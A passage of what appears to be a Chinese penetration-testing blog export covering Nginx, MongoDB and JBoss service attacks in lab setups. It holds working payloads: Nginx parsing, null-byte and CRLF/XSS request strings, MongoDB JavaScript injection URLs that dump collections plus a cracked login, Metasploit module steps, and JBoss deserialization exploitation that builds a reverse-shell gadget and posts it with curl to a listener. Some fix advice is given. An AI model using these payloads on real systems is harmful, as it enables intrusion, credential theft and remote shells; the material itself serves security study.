简介\n\nNginx是一个高性能的[HTTP](https://baike.baidu.com/item/HTTP)和[反向代理](https://baike.baidu.com/item/反向代理/7793488)web服务器，同时也提供了IMAP/POP3/SMTP服务。Nginx是由伊戈尔·赛索耶夫为[俄罗斯](https://baike.baidu.com/item/俄罗斯/125568)访问量第二的Rambler.ru站点（俄文：Рамблер）开发的，第一个公开版本0.1.0发布于2004年10月4日。\n\n其将[源代码](https://baike.baidu.com/item/源代码/3814213)以类[BSD许可证](https://baike.baidu.com/item/BSD许可证/10642412)的形式发布，因它的稳定性、丰富的功能集、示例配置文件和低系统资源的消耗而[闻名](https://baike.baidu.com/item/闻名/2303308)。2011年6月1日，nginx 1.0.4发布。\n\nNginx是一款[轻量级](https://baike.baidu.com/item/轻量级/10002835)的[Web](https://baike.baidu.com/item/Web/150564) 服务器/[反向代理](https://baike.baidu.com/item/反向代理/7793488)服务器及[电子邮件](https://baike.baidu.com/item/电子邮件/111106)（IMAP/POP3）代理服务器，在BSD-like 协议下发行。其特点是占有内存少，[并发](https://baike.baidu.com/item/并发/11024806)能力强，事实上nginx的并发能力在同类型的网页服务器中表现较好，中国大陆使\n\n用Nginx网站用户有：百度、[京东](https://baike.baidu.com/item/京东/210931)、[新浪](https://baike.baidu.com/item/新浪/125692)、[网易](https://baike.baidu.com/item/网易/185754)、[腾讯](https://baike.baidu.com/item/腾讯/112204)、[淘宝](https://baike.baidu.com/item/淘宝/145661)等。\n\n## 优点\n\n```\n1.适用于高并发\n2.可以做负载均衡服务器和HTTP服务器\n3.代码的特点\n4.可以作为代理服务器\n```\n\n具体可以自己去了解一下、、、\n\n\n\n## 可以用来做什么\n\n```\n1.静态HTTP服务\n2.反向代理服务器\n3.负载均衡\n4.虚拟主机\n5.正向代理\n```\n\n\n\n具体可以自己去了解一下、、、\n\n\n\n## Nginx和Apache的比较\n\n- 相同点\n\n```\n1、都是HTTPServer软件\n2、功能上都采用模块化结构设计\n3、都支持通用的语言接口。如PHP、Perl、Python等\n4、支持正向、反向代理、虚拟主机、URL重写、压缩传输、SSL加密传输\n```\n\n\n\n- 不同点\n\n```\n1、Apache处理速度非常慢，占用非常多内存资源\n\n2、功能上，Apαche全部模块支持动静态编译，Nginx模块都是静态编译的\n\n3、对Fcgi的支持：Apache支持的非常不好，Nginx支持非常好\n\n4、处理连接方式：Nginx支持epoll，Apache不支持\n\n5、空间使用上：Nginx安装包仅几百K\n```\n\n\n\n\n\n## 环境安装\n\n\n\n这边我还是用phpstudy吧\n\n\n\n![1619179100520](https://gitee.com/work-hard-every-day/test/raw/master/img/1619179100520.png)\n\n\n\n去看看底层目录\n\n\n\n有一个可执行文件\n\n\n\n![1619179181981](https://gitee.com/work-hard-every-day/test/raw/master/img/1619179181981.png)\n\n\n\n配置文件\n\n\n\n![1619179206335](https://gitee.com/work-hard-every-day/test/raw/master/img/1619179206335.png)\n\n\n\n访问一下\n\n\n\n![1619179443693](https://gitee.com/work-hard-every-day/test/raw/master/img/1619179443693.png)\n\n\n\n## 1.文件解析漏洞\n\n\n\n对于任意文件名，在后面添加`/xxx.php`（xxx为任意字符）即可将文件作为php解析\n\n\n\n![1619180308329](https://gitee.com/work-hard-every-day/test/raw/master/img/1619180308329.png)\n\n\n\n我们访问2.jpg是不可以的\n\n\n\n![1619180679445](https://gitee.com/work-hard-every-day/test/raw/master/img/1619180679445.png)\n\n\n\n利用解析漏洞进行绕过\n\n\n\n![1619180706949](https://gitee.com/work-hard-every-day/test/raw/master/img/1619180706949.png)\n\n\n\n### 漏洞分析\n\n这个漏洞是 Nginx配置所导致，与 Nginx版本无关\n\n\n\n当攻击者访问/2.jpg/sss.php时，Nginx将查看URL，看到它以php结尾，并将路径传递给`PHP fastcgi`处理程序\n\n去看看Nginx的配置文件\n\n\n\n![1619180880357](https://gitee.com/work-hard-every-day/test/raw/master/img/1619180880357.png)\n\n\n\n当我们继续添加后缀时\n\n\n\n会顺势显示后缀\n\n\n\n![1619181050576](https://gitee.com/work-hard-every-day/test/raw/master/img/1619181050576.png)\n\n\n\nphp的一个选项：cgi.fix_pathinfo，该选项默认开启，值为1，用于修理路径的\n\n拿一个例子来捋一下：\n\n当php遇到文件路径`/2.jpg/sss.php/sss.aaa`时，若`/2.jpg/sss.php/sss.aaa`不存在，则会去掉最后的`/sss.aaa`，然后判断`/2.jpg/sss.php`是否存在，若存在则将\n`/2.jpg/sss.php`当作文件`/2.jpg/sss.php/sss.aaa`若`/2.jpg/sss.php`仍不存在，则继续去掉`sss.php`，依此类推\n\n### 修复建议\n\n\n\n```\n1.配置cgi.fix_pathinfo（php.ini中）为0并重启php-cgi程序！\n2.如果需要使用到cgi.fix_pathinfo这个特性（例如：Wordpress），那么可以禁止上传目录的执行脚本权限。\n或将上传存储的內容与网站分离，即站库分离。\n3.高版本PHP提供了 security.Limit_extensions这个配置参数，设置 security.Limit extensions= .php\n```\n\n\n\n\n\n## 2.目录遍历漏洞\n\n\n\nNginx的目录遍历属于配置方面的问题，错误的配置可到导致目录遍历与源码泄露\n\n\n\n复现去修改一下\n\n\n\n去配置文件中\n\n\n\n```\nC:\\phpStudy\\nginx\\conf\n```\n\n\n\n\n\n![1619181150896](https://gitee.com/work-hard-every-day/test/raw/master/img/1619181150896.png)\n\n\n\n把这个开关开起来 （改成on）\n\n\n\n然后我们访问目录时 会构成目录遍历\n\n\n\n![1619181345044](https://gitee.com/work-hard-every-day/test/raw/master/img/1619181345044.png)\n\n\n\n\n\n\n\n\n\n![1619181319132](https://gitee.com/work-hard-every-day/test/raw/master/img/1619181319132.png)\n\n\n\n\n\n## 3.空字节任意代码执行漏洞\n\n\n\n### 漏洞分析\n\n\n\nNginx在遇到`%00`空字节时与后端 `FastCGI`处理不一致，导致可以在图片中嵌入PHP代码然后通过访问 `xxx.jpg%00.php`来执行其中的代码！\n\n\n\n### 影响版本\n\n```\nnginx 0.5.*\nnginx 0.6.*\nnginx 0.7 <= 0.7.65\nnginx 0.8 <= 0.8.37\n```\n\n\n\n### 复现\n\n\n\n文件目录在这里\n\n\n\n![1619182073158](https://gitee.com/work-hard-every-day/test/raw/master/img/1619182073158.png)\n\n\n\n\n\n写一个phpinfo的1.php  访问一下\n\n\n\n![1619182395414](https://gitee.com/work-hard-every-day/test/raw/master/img/1619182395414.png)\n\n\n\n搞一个phpinfo的3.jpg文件\n\n\n\n![1619182674765](https://gitee.com/work-hard-every-day/test/raw/master/img/1619182674765.png)\n\n\n\n抓包进行修改\n\n\n\n随便`..`  不然抓不了包\n\n\n\n因为它是无法访问的图片\n\n\n\n正常图片的话 就是可以的\n\n\n\n![1619182916445](https://gitee.com/work-hard-every-day/test/raw/master/img/1619182916445.png)\n\n漏洞来了\n\n\n\n![](https://gitee.com/work-hard-every-day/test/raw/master/img/1619183034111.png)\n\n![1619183787754](https://gitee.com/work-hard-every-day/test/raw/master/img/1619183787754.png)\n\n\n\n把这里修改成00  形成空字节 然后放包  \n\n\n\n![1619183814538](https://gitee.com/work-hard-every-day/test/raw/master/img/1619183814538.png)\n\n\n\n![1619183735849](https://gitee.com/work-hard-every-day/test/raw/master/img/1619183735849.png)\n\n\n\n\n\n## 4.CRLF漏洞\n\n\n\n### 漏洞产生\n\n\n\nNginⅸx会将`$uri`进行解码，导致传入`%0a%d`即可引入**换行符**，造成CRLF注入漏洞\n\n\n\n错误的配置文件\n\n\n\n是这样\n\n\n\n```\nlocation / { \n return 302 https://$host$uri;\n}\n```\n\n\n\n原本的目的是为了让http的请求跳转到https上的，意思就是配置实现了强制跳转的功能\n\n当用户访问Nginx服务器时由于此配置的存在会被强制跳转到以https协议访问之前访问的链接！\n\n\n\n访问的是：http://www.com\n\n实际走的是：https://www.com\n\n这里在提一下：因为https的安全机制是要比http高很多的\n\n\n\n### 漏洞复现\n\n![1619231933177](https://gitee.com/work-hard-every-day/test/raw/master/img/1619231933177.png)\n\n\n\n添加这一行代码\n\n\n\n```\nreturn 302 https://$host$uri;\n```\n\n\n\n\n\n![1619232927192](https://gitee.com/work-hard-every-day/test/raw/master/img/1619232927192.png)\n\n\n\n\n\n```\n1、配置中的$uri是我们可以控制的，这样我们就可以在$url处填入CRLF，然后对服务器进行访问实现头部注入\n2、服务器会返回一个302跳转给用户，所以我们注入的头部参数又会返回到客户这边\n```\n\n\n\n我们访问一下\n\n\n\n![1619232436489](https://gitee.com/work-hard-every-day/test/raw/master/img/1619232436489.png)\n\n\n\n可以看到它自动跳转到https了\n\n### 漏洞危害\n\n劫持合法用户会话，利用管理员身份进行恶意操作，篡改页面内容、进一步渗透网站等等！\n\n利用 CRLF Injection设置一个 SESSION，造成一个“会话固定漏洞\n\n### 原理\n\nNginx会将`$uri`进行解码，导致传入`%0a%0d`即可引入换行符，造成CRLF注入漏洞！！\n\n\n\n**$uri跳转HTPS，$uri就会产生‰0a‰0d换行符，换行符就一定存在CRLF注入漏洞**\n\n\n\n### 漏洞复现\n\n\n\n访问phpinfo的1.php   \n\n\n\n然后进行抓包\n\n\n\n![1619233405569](https://gitee.com/work-hard-every-day/test/raw/master/img/1619233405569.png)\n\n\n\n\n\n添加\n\n\n\n```\n/%0ASet-cookie:JSPSESSID%3D36\n```\n\n\n\n\n\n可以看到他有了 302的跳转\n\n\n\n![1619233449156](https://gitee.com/work-hard-every-day/test/raw/master/img/1619233449156.png)\n\n## 5.CRLF+XSS(CVE-2016-9964)\n\n\n\n```\n/%0D%0A%0D%0A%3Cimg%20src=1%20onerror=alert(/xss/)%3E\n```\n\n\n\n可以看到它是弹了一个xss的窗口的\n\n\n\n![1619233696522](https://gitee.com/work-hard-every-day/test/raw/master/img/1619233696522.png)\n\n\n\n\n\n然后我放包\n\n\n\n页面没有弹xss的窗口\n\n\n\n![1619233751073](https://gitee.com/work-hard-every-day/test/raw/master/img/1619233751073.png)\n\n\n\n\n\n因为高版本的浏览器防止CRLF去弹XSS\n\n\n\n### 原理\n\n [Bottle HTTP 头注入漏洞探究 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html) \n\n\n\n [新浪某站CRLF Injection导致的安全问题 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/Sina-CRLF-Injection.html) \n\n\n\n## 6.文件名逻辑漏洞(CVE-2013-4547)\n\n\n\n### 影响版本\n\nNginx : 0.8.41~1.4.3/1.5.0~1.5.7\n\n\n\n### 说明\n\n\n\n在 Windows环境下，后来发现要文件名的后面存在空格，而 Windows是不允许存在此类文件的\n\n\n\n复现，使用 Vulhub的 docker进行复现  默认开启端口是8080\n\n\n\n漏洞目录：cd vulhub/nginxCVE-2013-4547/\n\n\n\n```\n启动：sudo docker-compose up -d\n```\n\n\n\n然后我们访问一下\n\n\n\n![1619237115922](https://gitee.com/work-hard-every-day/test/raw/master/img/1619237115922.png)\n\n 抓包 上传一个phpinfo信息的a001.jpg\n\n\n\n![1619237381202](https://gitee.com/work-hard-every-day/test/raw/master/img/1619237381202.png)\n\n后+一个空格 然后放包\n\n\n\n![1619237691097](https://gitee.com/work-hard-every-day/test/raw/master/img/1619237691097.png)\n\n![1619237720969](https://gitee.com/work-hard-every-day/test/raw/master/img/1619237720969.png)\n\n继续抓包 `/uploadfiles/a001.jpg...php` \n\n\n\n![1619238052393](https://gitee.com/work-hard-every-day/test/raw/master/img/1619238052393.png)\n\n\n\n\n\n将`...php`前面的两个点的改Hex  改成20 00\n\n\n\n![1619238080563](https://gitee.com/work-hard-every-day/test/raw/master/img/1619238080563.png)\n\n\n\n![1619238101060](https://gitee.com/work-hard-every-day/test/raw/master/img/1619238101060.png)\n\n\n\n\n\n然后进行放包\n\n\n\n成功回显\n\n\n\n![1619238123647](https://gitee.com/work-hard-every-day/test/raw/master/img/1619238123647.png)\n\n\n\n### 原理\n\n![1619238285125](https://gitee.com/work-hard-every-day/test/raw/master/img/1619238285125.png)\n\n\n\n## 7.整数溢出(CVE-2017-7529)\n\n## 漏洞分析\n\n在 Nginx的 range filter中存在整数溢出漏洞，可以通过带有特殊构造的 range的HHTP头的恶意请求引发这个整数溢出漏洞，并导致信息泄露\n\n有兴趣的可以看这里\n\n [Nginx 整数溢出(CVE-2017-7529)漏洞分析 (seebug.org)](https://paper.seebug.org/353/) ","tags":["Nginx总结"],"categories":["服务攻防"]},{"title":"MongoDB总结","url":"/2021/06/22/MongoDB/","content":"\n**MongoDB**\n\n<!--more-->\n\n# MongoDB\n\n## 默认端口\n\n\n默认端口-->27017-->mongod和 mongos实例的默认端口。你可以通过port或-port改变该端口\n\n默认端口-->27018-->设置--shardsvr运行变量或在配置文件里设置clusterRole为shardsvr时的默认端口\n\n\n\n## Windows平台安装MongoDB\n\n官网下载地址：https://www.mongodb.com/try/download/community\n\n我这边在Windows环境下载的\n\n\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210414081629629.png)\n\n\n\n搞的是最新版的\n\n默认安装就可以了\n\n安装完成就打开了\n\n\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210414082431111.png)\n\n\n\n\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210414082457605.png)\n\n\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210414082526916.png)\n\n\n\n默认没啥字密码 直接连接就可以\n\n\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210414082600249.png)\n\n\n\n\n\n到安装目录去了解一下\n\n\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210414082747337.png)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210414082806545.png)\n\n\n\n\n\n\n- mongo.exe # MongoDB客户端软件\n- mongod.exe # MongoDB服务端软件\n- mongod.cfg      # MongDb的配置文件\n\n\n\n解析一下MongDb的配置文件\n\n```c\n#系统日志相关\nsystemLog:\ndestination: file #使用文件存储日志\npath:C：mongodb\\Log\\mongodb.log#日志位置![在这里插入图片描述](https://img-blog.csdnimg.cn/20210414153819455.png)\n\nLogAppend:true#  是否以追加的形式记录日志\n\n#数据相关\nstorage:\njournal: #回滚日志\nenabled true \ndbPath:C：mongodb\\data #数据存储目录\n\n#网络配置相关\nnet:\nport：27017  #默认端口\nbindIp：127.0.0.1  #绑定ip\n```\n\n这里这个绑定ip是本地的 \n\n我们修改一下 \n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210414153913146.png)\n\n\n\n碰到权限问题 自己处理一下\n\n\n然后去配置环境变量\n\n把bin目录的路径 添加到环境变量中的系统变量中的Path中\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210414154255592.png)\n\n\n就可以了 \n\n测试一下\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210414154822690.png)\n\n管理Mongodb数据库的话\n\n也是有工具的 自己去下载一下\n\nnavicat150_mongodb_cs_x64\n\nrobo3t-1.4.3-windows-x86_64-48f7dfd\n\n都是可以的 安装的话 默认然后一直下一步就好了\n\n\n\n## kali下安装MongoDB\n\n```c\nwget -qO - https://www.mongodb.org/static/pgp/server-4.4.asc | sudo apt-key add -\n```\n应该要响应OK的\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210414171040842.png)\n\n```c\necho \"deb http://repo.mongodb.org/apt/debian buster/mongodb-org/4.4 main\" | sudo tee /etc/apt/sources.list.d/mongodb-org-4.4.list\n```\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210414172047978.png)\nsudo apt-get update\n\n```c\nproxychains apt-get install -y mongodb-org \n```\n\n这边要科学上网才可以\n\n这个我就不说了\n\n启动命令\n\n```c\nsudo systemctl start mongod\n```\n\n查看一下端口\n\n```c\nnetstat -nultp\n```\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210414174305969.png)\n\n修改登录IP  因为我们要远程登录的嘛\n\n\n找一下它的配置文件\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210414174531888.png)\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210414174614960.png)\n重新启动Mongodb数据库\n\n```c\nsudo systemctl restart mongod\n```\n\nWindows远程连接Kali\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210414175303240.png)\n填写kali的IP\n\n测试连接一下 是成功的\n\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210414175348260.png)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210414175632808.png)\nok这就连接成功了\n\n## 简单使用一下\n\n```c\nmongo 进来\nshow dbs 查库\nuse a001 创建一个库\n这里要注意 只有这个库下有东西 查库的时候 才会显示\n现在还是虚的\ndb 查看当前在哪个库下\n```\n\n```c\n把data数据插入到a001数据库下\ndb.data.insert({\"user\":\"test1\"})\n```\n\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210414180136422.png)\n\n查数据库下的东西\n\n\n\n```c\ndb.data.find()\n```\n\n\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210414180224127.png)\n\n\n\n因为插入的是data数据\n\n\n\n多来几条数据\n\n这里注意值可以一样 但是键是不可以一样的\n\n```c\ndb.data.insert({\"user2\":\"test1\"})\ndb.data.insert({\"user3\":\"test1\"})\ndb.data.insert({\"user4\":\"test1\"})\n```\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210414180510785.png)\n删除数据\n\n\n```c\ndb.data.remove({\"user4\":\"test1\"})\n```\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210414180628256.png)\nok 就这样了\n\n删除集合  \n\n\n\n比如删除data集合用drop()方法\n\n\n\n```c\nshow collections;\ndb.data.drop()\nshow collections;\n```\n\n\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210414180831544.png)\n\n删除目前使用的数据库\n\n```c\ndb.dropDatabase()\n```\n\n\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20210414180925798.png)\n\n\n\n使 PHP Web应用程序能够使用 MongoDB，我们需要安装PHP驱动程序\n\n```\nsudo apt-get install php-pear\napt-get install php-mongodb\n```\n\n## 注入MongoDB\n\n这边我用墨者学院的练习题进行演示一下\n\n免费的\n\n地址：https://www.mozhe.cn/\n\n\n\n![1619698551399](C:\\Users\\12550\\AppData\\Roaming\\Typora\\typora-user-images\\1619698551399.png)\n\n\n\n![1619698563509](C:\\Users\\12550\\AppData\\Roaming\\Typora\\typora-user-images\\1619698563509.png)\n\n\n\n\n\n![1619698683292](C:\\Users\\12550\\AppData\\Roaming\\Typora\\typora-user-images\\1619698683292.png)\n\n\n\n![1619698696446](C:\\Users\\12550\\AppData\\Roaming\\Typora\\typora-user-images\\1619698696446.png)\n\n\n\n1.单引号%27测试到注入点\n\n\n\n![1619698729160](C:\\Users\\12550\\AppData\\Roaming\\Typora\\typora-user-images\\1619698729160.png)\n\n\n\n\n\n构造简单的链接测试回显\n\n```\n/new_list.php?id=1'}); return ({title:1,content:'2\n```\n\n\n\n![1619698908561](C:\\Users\\12550\\AppData\\Roaming\\Typora\\typora-user-images\\1619698908561.png)\n\n\n\n爆库\n\n\n\n```\n/new_list.php?id=1'}); return ({title:tojson(db),content:'1\n```\n\n\n\n![1619699059432](C:\\Users\\12550\\AppData\\Roaming\\Typora\\typora-user-images\\1619699059432.png)\n\n```\nmozhe_cms_Authority\n```\n\n\n\n\n\n爆表\n\n```\n/new_list.php?id=1'}); return ({title:tojson(db.getCollectionNames()),content:'1\n```\n\n\n\ndb.getCollectionNames()返回的是数组，需要用to json转换为字符串\n\n**并且MongoDB数据库区分大小写**\n\n\n\n![1619699101231](C:\\Users\\12550\\AppData\\Roaming\\Typora\\typora-user-images\\1619699101231.png)\n\n\n\n爆字段\n\n\n\n```\n/new_list.php?id=1'}); return ({title:tojson(db.Authority_confidential.find()[0]),\ncontent:'1\n```\n\n\n\n是当前用的集合，find用于查找，0是第一条数据\n\n\n\n![1619699164607](C:\\Users\\12550\\AppData\\Roaming\\Typora\\typora-user-images\\1619699164607.png)\n\n\n\n![1619699181276](C:\\Users\\12550\\AppData\\Roaming\\Typora\\typora-user-images\\1619699181276.png)\n\n\n\n![1619700092357](C:\\Users\\12550\\AppData\\Roaming\\Typora\\typora-user-images\\1619700092357.png)\n\n\n\n说明只有两个表\n\n\n\n然后它的密码是md5加密的 去破解就好了\n\n\n\n贴个链接\n\n [www.cmd5.com](https://www.cmd5.com/) \n\n\n\n![1619700202476](C:\\Users\\12550\\AppData\\Roaming\\Typora\\typora-user-images\\1619700202476.png)\n\n\n\n![1619700225858](C:\\Users\\12550\\AppData\\Roaming\\Typora\\typora-user-images\\1619700225858.png)\n\n\n\n进行登录\n\n```\nmozhe\n610254\n```\n\n\n\n\n\n![1619702487926](C:\\Users\\12550\\AppData\\Roaming\\Typora\\typora-user-images\\1619702487926.png)\n\n\n\n这里要讲一下\n\nmongodb的认证(authentication)与授权(authorization)\n\n连接Mongodb的时候，除了需要用户名，密码，还需要指定这个用户的认证db\n\n为什么需要指定这个认证db？\n\n是因为Mongodb允许存在多个同名的用户存在，但同名的用户认证db必须不能相同，如下： \n\n```\nmongo --host 219.153.49.228 -u \"mozhe\" --authenticationDatabase \"mozhe\" -p'610254'\n```\n\n\n\n## MSF渗透MongoDB\n\n### 未授权访问\n\nMongDB默认端口是27017，当配置无验证时，存在未授权访问\n\n进行验证\n\n扫描对端或者网段有没有开启27017端口\n\n\n\n![1619703576348](C:\\Users\\12550\\AppData\\Roaming\\Typora\\typora-user-images\\1619703576348.png)\n\n\n\n就是这一条\n\n```\nuse auxiliary/scanner/mongodb/mongodb_login\nset rhosts 192.168.175.0/24\nset threads 10\nexploit\n```\n\n\n\n![1619704557151](C:\\Users\\12550\\AppData\\Roaming\\Typora\\typora-user-images\\1619704557151.png)\n\n\n\n### exp利用\n\n\n\n但是这里拿不到shell 也算是验证\n\n\n\n```\nuse exploit/linux/misc/mongod_native_helper\nset rhosts 192.168.175.166\nexploit\n```\n\n\n\n![1619704731351](C:\\Users\\12550\\AppData\\Roaming\\Typora\\typora-user-images\\1619704731351.png)\n\n\n\n## 自动化评估\n\n","tags":["MongoDB总结"],"categories":["服务攻防"]},{"title":"Jboss总结","url":"/2021/06/22/Jboss/","content":"\n**Jboss**\n\n<!--more-->\n\n# Jboss\n\n## 简介\n\nJBoss是一个基于J2EE的开发源代码的应用服务器。JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB1.1、EJB2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或 Jetty绑定使用。\n\nJetty是一个开源的servlet容器，它为基于Java的web容器，例如JSP和 servlet提供运行环境。Jetty是使用Java语言编写的，它的API以一组JAR包的形式发布。开发人员可以将 Jetty容器实例化成一个对象，可以迅速为一些独立运行(stand-alone)的Java应用提供网络和web连接。\n\n## 默认端口\n\n```\n8080 9990\n```\n\n## 安装\n\n官网： https://jbossas.jboss.org/downloads/ \n\n需要安装Java环境  这里要注意JDK的版本 java7\n\n\n\n![1619447111171](https://gitee.com/work-hard-every-day/test/raw/master/img/1619447111171.png)\n\n配置Jboss环境变量\n\n```\nJBOSS_HOME C:\\JBoss6\\jboss-6.1.0.Final\n```\n\n![1619446909142](https://gitee.com/work-hard-every-day/test/raw/master/img/1619446909142.png)\n\n\n\n```\n;%JBOSS_HOME%\\bin;\n```\n\n\n\n\n\n\n\n![1619446953719](https://gitee.com/work-hard-every-day/test/raw/master/img/1619446953719.png)\n\n\n\n![1619490387253](https://gitee.com/work-hard-every-day/test/raw/master/img/1619490387253.png)\n\n\n\n进行启动\n\n\n\n![1619447249477](https://gitee.com/work-hard-every-day/test/raw/master/img/1619447249477.png)\n\n\n\n出现INFO 说明配置成功\n\n\n\n![1619447305216](https://gitee.com/work-hard-every-day/test/raw/master/img/1619447305216.png)\n\n\n\nJboss默认部署路径\n\n\n\n```\nxxx\\jboss-6.1.0.Final\\server\\default\\deploy\\ROOT.war\n```\n\n\n\n本地访问一下\n\n\n\n![1619486155535](https://gitee.com/work-hard-every-day/test/raw/master/img/1619486155535.png)\n\n\n\n修改内容 达到远程访问\n\n\n\n`xxx\\jboss-6.1.0.Final\\server\\default\\deploy\\jbossweb.sar\\server.xml`修改配置\n\n![1619486216237](https://gitee.com/work-hard-every-day/test/raw/master/img/1619486216237.png)\n\n\n\n```\n将address=\"${jboss.bind.address}\"-->address=\"0.0.0.0\"\n```\n\n\n\n![](https://gitee.com/work-hard-every-day/test/raw/master/img/1619486304640.png)\n\n\n\n重启一下\n\n\n\nkali远程访问\n\n\n\n![1619488579969](https://gitee.com/work-hard-every-day/test/raw/master/img/1619488579969.png)\n\n# Jboss渗透\n\n## JBoss 5.x/6.x反序列化漏洞(CVE-2017-12149)\n\n### 漏洞原理\n\nJBOSSApplication Server反序列化命令执行漏洞,远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码\n\n### 验证是否存在漏洞\n\n```\n/invoker/readonly\n```\n\n![1619488613005](https://gitee.com/work-hard-every-day/test/raw/master/img/1619488613005.png)\n\n返回500，说明此页面存在反序列化漏洞\n\n\n\n### 漏洞利用\n\n配置javac的环境\n\n我这边在kali进行操作\n\n```\ncd /opt\ncurl http://www.joaomatosf.com/rnp/java_files/jdk-8u20-linux-x64.tar.gz -o jdk-8u20-linux-x64.tar.gz\n## 这里要科学上网 配置代理\n\ntar zxvf jdk-8u20-linux-x64.tar.gz\nrm -rf /usr/bin/java*\nln -s /opt/jdk1.8.0_20/bin/j* /usr/bin\njavac -version\njava -version\n```\n\n\n\n成功安装\n\n不用管上面那个报错\n\n\n\n![1619488997104](https://gitee.com/work-hard-every-day/test/raw/master/img/1619488997104.png)\n\n\n\n利用工具：JavaDeserH2HC\n\n```\nhttps://github.com/joaomatosf/JavaDeserH2HC\n```\n\n\n\n我们选择一个 Gadget：ReverseshellCommonsCollectionsHashMap，编译并生成序列化数据：\n\n\n\n![1619489165555](https://gitee.com/work-hard-every-day/test/raw/master/img/1619489165555.png)\n\n\n\n生成：ReverseShellCommonsCollectionsHashMap.class\n\n```\njavac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java\n```\n\n\n\n生成：ReverseShellCommonsCollectionsHashMap.ser\n\n\n\n```\njava -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap IP:端口\n#IP和端口是vps上nc监听的\njava -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.175.161:8888\n```\n\n\n\n开启监听\n\n```\nnc -lvvp 8888\n```\n\n\n\n利用：ReverseShellCommonsCollectionsHashMap.ser\n\n\n\n```\ncurl http://192.168.175.195:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser\n```\n\n\n\n成功拿到反弹shell\n\n![1619489453167](https://gitee.com/work-hard-every-day/test/raw/master/img/1619489453167.png)\n\n\n\n## JBoss JMXInvokerServlet反序列化漏洞(CVE-2015-7501)\n\n### 漏洞原理\n\nJBoss中`invoker/JMXInvokerServlet`路径对外开放，JBoss的jmx组件支持Java反序列化\n\n\n\n### 验证漏洞\n\n```\n/invoker/JMXInvokerServlet\n```\n\n\n\n\n\n![1619489513404](https://gitee.com/work-hard-every-day/test/raw/master/img/1619489513404.png)\n\n\n\n如上，说明接口开放，此接口存在反序列化漏洞\n\n\n\n### 漏洞利用\n\n直接利用CVE-2017-12149的ReverseShellCommonsCollectionsHashMap.ser发送到`/invoker/JMXInvokerServlet`接口中\n\n\n\n```\ncurl http://192.168.175.195:8080/invoker/JMXInvokerServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser\n```\n\n\n\n同样是要开启监听\n\n\n\n![1619489712013](https://gitee.com/work-hard-every-day/test/raw/master/img/1619489712013.png)\n\n\n\n成功拿到shell\n\n\n\n![1619489746945](https://gitee.com/work-hard-every-day/test/raw/master/img/1619489746945.png)\n\n\n\n### 修复建议\n\n1.不需要`http-invoker.sar`组件的用户  可以直接删除掉\n\n\n\n路径为：C:\\JBoss6\\jboss-6.1.0.Final\\server\\default\\deploy\n\n\n\n![1619578923043](https://gitee.com/work-hard-every-day/test/raw/master/img/1619578923043.png)\n\n\n\n2.添加如下代码至http-invoker.sar下web.xml的`security-constraint`标签中，对http-invoker组件进行访问控制\n\n\n\n![1619579149845](https://gitee.com/work-hard-every-day/test/raw/master/img/1619579149845.png)\n\n\n\n```\n<url-pattern>/*</url-pattern>\n```\n\n\n\n\n\n![1619579472052](https://gitee.com/work-hard-every-day/test/raw/master/img/1619579472052.png)\n\n## JbossMO JMS反序列化漏洞(CVE-2017-7504）\n\n### 漏洞原理\n\nJboss AS 4.x及之前版本中，JbossMQ实现过程的 JMS over HTTP Invocation Layer的HTTPServerlLServlet.java文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码\n\n\n\n### 影响版本\n\nJboss AS 4.x以及之前所有的版本\n\n### 安装Jboss4\n\n需要安装Java环境  这里要注意JDK的版本 java6\n\n![1619490273026](https://gitee.com/work-hard-every-day/test/raw/master/img/1619490273026.png)\n\n同样是需要配置Jboss环境变量\n\n![1619490342237](https://gitee.com/work-hard-every-day/test/raw/master/img/1619490342237.png)\n\n运行run.bat  \n\n出现INFO  